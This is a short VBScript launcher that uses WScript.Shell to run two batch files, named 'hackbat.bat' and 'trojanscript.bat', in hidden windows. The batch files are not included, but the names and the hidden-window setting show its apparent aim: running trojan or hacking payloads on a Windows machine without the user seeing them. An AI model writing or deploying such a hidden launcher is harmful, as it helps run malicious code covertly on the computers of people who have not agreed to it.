Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "hackbat.bat" & Chr(34), 0
WshShell.Run chr(34) & "trojanscript.bat" & Chr(34), 0
Set WshShell = Nothing